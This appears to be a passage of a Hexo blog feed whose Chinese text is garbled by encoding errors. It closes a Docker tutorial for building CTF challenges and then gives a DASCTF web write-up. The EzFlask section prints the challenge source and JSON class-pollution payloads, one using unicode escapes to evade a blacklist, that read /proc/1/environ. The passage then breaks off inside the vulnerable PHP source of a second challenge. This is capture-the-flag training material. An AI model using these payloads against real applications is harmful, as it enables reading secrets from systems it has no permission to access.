class="keyword">index</span>.phpä¸å¿…å¤šè¯´ï¼Œä¸»è¦æ˜¯å®Œå–„ä½ è‡ªå·±æƒ³å‡ºçš„<span class="keyword">sql</span>è¯­å¥ä»¥åŠè¿‡æ»¤ç­‰</span><br><span class="line"></span><br><span class="line">docker-entrypoint.sh é‡Œé¢æœ‰ä¸¤ç§flagçš„ç”Ÿæˆæ ¼å¼ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦è¿›è¡Œä¿®æ”¹</span><br><span class="line"></span><br><span class="line">docker-compose.yaml å¯ä»¥è°ƒæ•´å¼€å¯çš„ç«¯å£ä»¥åŠç¯å¢ƒå˜é‡ç­‰å› ç´ </span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ï¼šDockerfile</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ ¹æ®ä¸Šè¿°ä»‹ç»ï¼Œå°†è‡ªå·±æ‰€éœ€è¦æ‰§è¡Œçš„æ“ä½œå†™å…¥dockerfileï¼Œä¸æ”¾å¿ƒçš„è¯å¯ä»¥è‡ªå·±æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨</strong></p><p>å®Œæˆä¸Šè¿°æ“ä½œåå°±å¯ä»¥å¯åŠ¨å®¹å™¨å•¦ï¼Œæ–¹æ³•æœ‰2ï¼š</p><p>ï¼ˆ1ï¼‰ï¼šå¦‚æœåªæœ‰ä¸€ä¸ªå®¹å™¨ï¼Œå¯ä»¥ç›´æ¥åœ¨ä½ çš„dockerfileç›®å½•ä½¿ç”¨docker buildå‘½ä»¤è¿›è¡Œåˆ›å»º</p><p>ï¼ˆ2ï¼‰ï¼šå¦‚æœæœ‰å¤šä¸ªå®¹å™¨éœ€è¦ç”¨åˆ°composeï¼Œé‚£ä¹ˆå¯ä»¥åœ¨.yamlç›®å½•ä¸­æ‰§è¡Œdocker-compose up -d</p>]]></content>
    
    
    <summary type="html">è‡´åŠ›äºå¸®åŠ©æ–°æ‰‹å’Œå°ç™½æ»´dockeræ•™ç¨‹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="å‡ºé¢˜æ•™ç¨‹" scheme="https://bowuchuling.github.io/categories/CTF/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="æ•™ç¨‹" scheme="https://bowuchuling.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF WEB WP</title>
    <link href="https://bowuchuling.github.io/posts/54ff006d.html"/>
    <id>https://bowuchuling.github.io/posts/54ff006d.html</id>
    <published>2023-07-25T10:52:33.026Z</published>
    <updated>2023-08-13T12:07:31.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®¡è®¡æºç ï¼Œå­˜åœ¨æ ‡å¿—æ€§å‡½æ•°mergeï¼Œä¸ºpythonç±»åŸå‹é“¾æ±¡æŸ“ï¼Œç»§ç»­å®¡è®¡å‘ç°å¯åˆ©ç”¨å‡½æ•°open(â€˜â€™,â€™â€™).read()ï¼Œæ„é€ jsonä»£ç ï¼Œä¿®æ”¹<strong>FILE</strong>çš„æ•°å€¼ä¸ºæƒ³è¦è¯»å–çš„å†…å®¹ï¼Œè¿™é‡Œè¯»å–ç¯å¢ƒå˜é‡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>: &#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/1/environ&quot;</span>&#125;&#125;&#125;</span><br><span class="line"><span class="regexp">//</span>å‰é¢çš„usernameå’Œpasswordæ˜¯ä¸ºäº†ç»•è¿‡ä»£ç æ£€æŸ¥</span><br></pre></td></tr></table></figure><p>æäº¤åç»æ£€æŸ¥å‘ç°å­—ç¬¦ä¸²<strong>init</strong>è¢«è¿‡æ»¤</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œå¯ä»¥ä½¿ç”¨unicodeç¼–ç è¿›è¡Œç»•è¿‡</span><br><span class="line"><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;<span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span>&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br><span class="line">æˆ–è€…ä½¿ç”¨userç±»çš„checkå‡½æ•°è¿›è¡Œå®ä¾‹åŒ–ç»•è¿‡</span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;check&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">session_start</span>();</span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$size</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="language-php">    </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>MyPicDisk<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;form method=&quot;POST&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    usernameï¼š&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    passwordï¼š&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    &lt;input type=&quot;submit&quot; value=&quot;ç™»å½•&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&#x27;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">echo</span> <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ç™»å½•æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  é€‰æ‹©å›¾ç‰‡ï¼š&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &#x27;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡ä¸Šä¼ æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span 